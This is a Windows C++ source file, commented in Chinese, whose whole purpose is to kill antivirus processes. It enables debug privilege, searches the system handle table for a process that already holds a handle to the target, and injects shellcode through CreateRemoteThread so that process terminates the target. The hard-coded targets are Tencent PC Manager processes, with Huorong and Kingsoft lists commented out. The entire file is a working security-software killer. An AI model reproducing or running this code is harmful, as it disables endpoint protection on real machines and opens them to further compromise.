#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
//#define PROCESS_NAME L"HipsTray.exe"
//#define PROCESS_NAME L"PCHunter64.exe"
//微软这玩意不公开这个结构
typedef _Enum_is_bitflag_ enum _POOL_TYPE {
	NonPagedPool,
	NonPagedPoolExecute = NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed = NonPagedPool + 2,
	DontUseThisType,
	NonPagedPoolCacheAligned = NonPagedPool + 4,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
	MaxPoolType,
	NonPagedPoolBase = 0,
	NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
	NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
	NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
	NonPagedPoolSession = 32,
	PagedPoolSession = NonPagedPoolSession + 1,
	NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
	DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
	NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
	PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
	NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
	NonPagedPoolNx = 512,
	NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
	NonPagedPoolSessionNx = NonPagedPoolNx + 32,
} _Enum_is_bitflag_ POOL_TYPE;
typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {
	UNICODE_STRING          TypeName;
	ULONG                   TotalNumberOfHandles;
	ULONG                   TotalNumberOfObjects;
	WCHAR                   Unused1[8];
	ULONG                   HighWaterNumberOfHandles;
	ULONG                   HighWaterNumberOfObjects;
	WCHAR                   Unused2[8];
	ACCESS_MASK             InvalidAttributes;
	GENERIC_MAPPING         GenericMapping;
	ACCESS_MASK             ValidAttributes;
	BOOLEAN                 SecurityRequired;
	BOOLEAN                 MaintainHandleCount;
	USHORT                  MaintainTypeList;
	POOL_TYPE	            PoolType;
	ULONG                   DefaultPagedPoolCharge;
	ULONG                   DefaultNonPagedPoolCharge;
	BYTE                    Unknown2[16];
} OWNPUBLIC_OBJECT_TYPE_INFORMATION, * POWNPUBLIC_OBJECT_TYPE_INFORMATION;
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG ProcessId;//进程标识符 
	UCHAR ObjectTypeNumber;//打开的对象的类型
	UCHAR Flags;//句柄属性标志
	USHORT Handle;//句柄数值,在进程打开的句柄中唯一标识某个句柄
	PVOID Object;//这个就是句柄对应的EPROCESS的地址
	ACCESS_MASK GrantedAccess;//句柄对象的访问权限
}SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_INFORMATION Information[655360];
}SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef BOOL(WINAPI* pTerminateProcess)(HANDLE, UINT);
typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
typedef NTSTATUS(WINAPI* fn_ZwQueryObject)(HANDLE,int,PVOID,ULONG,PULONG);
typedef NTSTATUS(NTAPI* fn_ZwQueryInformationProcess)(HANDLE,int,PVOID,ULONG,PULONG);
typedef NTSTATUS(NTAPI* fn_ZwQuerySystemInformation)(int, PVOID, ULONG, PULONG);

fn_ZwQueryInformationProcess pfn_ZwQueryInformationProcess;
fn_ZwQueryObject pfn_ZwQueryObject;
fn_ZwQuerySystemInformation pfn_ZwQuerySystemInformation;
UINT g_ProcessID;
DWORD g_MainMoudle,g_SizeOfImage;
typedef struct _SHELLCODE
{
	HANDLE fnHandle;
	DWORD fnPID;
	pTerminateProcess fnTerminateProcess;
	pOpenProcess fnOpenProcess;
}SHELLCODE, * PSHELLCODE;
DWORD WINAPI InjectShellCode(PVOID p)
{
	PSHELLCODE shellcode = (PSHELLCODE)p;
	//由于火绒没有Terminate权限,所以使用方案2
	//shellcode->fnTerminateProcess(shellcode->fnHandle,0);
	HANDLE hProcess = shellcode->fnOpenProcess(0x001FFFFF, 0, shellcode->fnPID);
	shellcode->fnTerminateProcess(hProcess, 0);
	return TRUE;
}
DWORD WINAPI InjectShellCodeEnd()
{
	return 0;
}

bool DoShellCodeInject(HANDLE handle, HANDLE TarHandle)
{
	bool success = false;
	LPVOID addrss_shellcode = VirtualAllocEx(handle, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (addrss_shellcode)
	{
		//设置shellcode
		SHELLCODE ManualInject;
		memset(&ManualInject, 0, sizeof(SHELLCODE));
		ManualInject.fnTerminateProcess = TerminateProcess;
		ManualInject.fnHandle = TarHandle;
		ManualInject.fnPID = g_ProcessID;
		ManualInject.fnOpenProcess = OpenProcess;
		std::cout << "TarHandle 0x" << std::hex << TarHandle << std::endl;
		//写shellcode到目标进程
		if (WriteProcessMemory(handle, addrss_shellcode, &ManualInject, sizeof(SHELLCODE), NULL) &&
			WriteProcessMemory(handle, (PVOID)((PSHELLCODE)addrss_shellcode + 1), InjectShellCode, (DWORD)InjectShellCodeEnd - (DWORD)InjectShellCode, NULL))
		{
			HANDLE hThread = CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)((PSHELLCODE)addrss_shellcode + 1), addrss_shellcode, 0, NULL);
			if (!hThread)
				std::cout << "CreateRemoteThread 失败 " << GetLastError() << std::endl;
			else
			{
				WaitForSingleObject(hThread, INFINITE);
				std::cout << "injected " << std::dec << GetProcessId(handle) <<" AT:"<< std::hex << addrss_shellcode << " Status "<< GetLastError() << std::endl;
				success = true;
			}
		}
		else
		{
			std::cout << "WriteProcessMemory 失败 " << GetLastError() << std::endl;
		}
		VirtualFreeEx(handle, addrss_shellcode, 0, MEM_RELEASE);
	}
	else
	{
		std::cout << "VirtualAllocEx 失败 " << GetLastError() << std::endl;
	}
	return success;
}
bool InitFunction()
{
	HMODULE NtDll = GetModuleHandleA("ntdll.dll");
	pfn_ZwQueryInformationProcess = NtDll ? (fn_ZwQueryInformationProcess)GetProcAddress(NtDll, "ZwQueryInformationProcess") : nullptr;
	pfn_ZwQueryObject = NtDll ? (fn_ZwQueryInformationProcess)GetProcAddress(NtDll, "ZwQueryObject") : nullptr;
	pfn_ZwQuerySystemInformation = NtDll ? (fn_ZwQuerySystemInformation)GetProcAddress(NtDll, "ZwQuerySystemInformation") : nullptr;
	return pfn_ZwQueryInformationProcess != nullptr && pfn_ZwQueryObject != nullptr && pfn_ZwQuerySystemInformation != nullptr;
}


bool ProcessName2Pid(std::wstring ProcessName)
{
	bool FoundPID = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		std::cout << "CreateToolhelp32Snapshot Error!" << std::endl;;
		return false;
	}
	bool bResult = Process32First(hProcessSnap, &pe32);
	while (bResult)
	{
		if (wcscmp(pe32.szExeFile, ProcessName.c_str()) == 0)
		{
			FoundPID = true;
			printf("ProcessName: %s \n", ProcessName.c_str());
			g_ProcessID = pe32.th32ProcessID;
			break;
		}
		bResult = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return FoundPID;
}


PSYSTEM_HANDLE_INFORMATION_EX QueryHandleTable()
{
	ULONG cbBuffer = sizeof(SYSTEM_HANDLE_INFORMATION_EX);
	LPVOID pBuffer = (LPVOID)malloc(cbBuffer);
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = nullptr;
	if (pBuffer)
	{
		pfn_ZwQuerySystemInformation(0x10, pBuffer, cbBuffer, NULL);
		HandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)pBuffer;
	}
	return HandleInfo;
}
DWORD64 GetTarEPROCESS()
{
	HANDLE TarHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, g_ProcessID);
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
	DWORD64 EPROCESS;
	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		if (HandleInfo->Information[i].Handle == (USHORT)TarHandle && HandleInfo->Information[i].ProcessId == GetCurrentProcessId())
		{
			EPROCESS = (DWORD64)HandleInfo->Information[i].Object;
			break;
		}
	}
	free(HandleInfo);
	CloseHandle(TarHandle);
	return EPROCESS;
}
bool FuckUpProcess()
{
	bool Found = false;
	DWORD64 TarEPROCESS = GetTarEPROCESS();
	if (!TarEPROCESS)
	{
		std::cout << "找不到EPROCESS" << std::endl;
		return Found;
	}
	PSYSTEM_HANDLE_INFORMATION_EX HandleInfo = QueryHandleTable();
	for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
	{
		//7 是 process 属性
		if (HandleInfo->Information[i].ObjectTypeNumber == 7)
		{
			if((DWORD64)HandleInfo->Information[i].Object != TarEPROCESS)
				continue;
			//排除掉目标进程的PID
			if (HandleInfo->Information[i].ProcessId == g_ProcessID)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_READ) != PROCESS_VM_READ)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_VM_OPERATION) != PROCESS_VM_OPERATION)
				continue;
			if ((HandleInfo->Information[i].GrantedAccess & PROCESS_QUERY_INFORMATION) != PROCESS_QUERY_INFORMATION)
				continue;
			//由于火绒找不到可用TERMINATE的权限,只能用方案2 但是PCHUNTER却可以
			//if ((HandleInfo->Information[i].GrantedAccess & PROCESS_TERMINATE) != PROCESS_TERMINATE)
			//	continue;
			//执行shellcode映射操作
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, HandleInfo->Information[i].ProcessId);
			if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
				continue;
			std::cout << "在 " << HandleInfo->Information[i].ProcessId << " 中找到了一个合适句柄! HANDLE 为: 0x" << std::hex << HandleInfo->Information[i].Handle << std::endl;
			if(!DoShellCodeInject(hProcess, (HANDLE)HandleInfo->Information[i].Handle))
				continue;
			Found = true;
			break;
		}
	}
	free(HandleInfo);
	return Found;
}

BOOL EnableDebugPrivilege(BOOL bEnable)
{
	BOOL fOK = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) //打开进程访问令牌
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOK = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOK;
}
void FuckOffProcessByName(std::wstring name)
{
	if (ProcessName2Pid(name))
	{
		std::cout << "g_ProcessID为 " << g_ProcessID << "\n";
		if (!FuckUpProcess())
			std::cout << "找不到可用句柄 \n";
	}
	else
	{
		std::cout << "找不到 PID! \n";
	}
}
int main(int argc, char* argv[])
{
	if (InitFunction() && EnableDebugPrivilege(TRUE))
	{
		//std::wstring process_list[] = {L"HipsMain.exe",L"HipsTray.exe",L"HipsDaemon.exe"};
		//std::wstring process_list[] = { L"kscan.exe",L"kwsprotect64.exe",L"kxescore.exe" ,L"kxetray.exe"};
		std::wstring process_list[] = { L"QMDL.exe",L"QMPersonalCenter.exe",L"QQPCPatch.exe" ,L"QQPCRealTimeSpeedup.exe",L"QQPCRTP.exe",L"QQPCTray.exe",L"QQPCTray.exe",L"QQRepair.exe" };
		for (auto iter : process_list)
		{
			FuckOffProcessByName(iter);
		}
	}
	else
	{
		std::cout << "找不到 ZwQueryInformationProcess 函数\n";
	}

	//std::cin.get();
}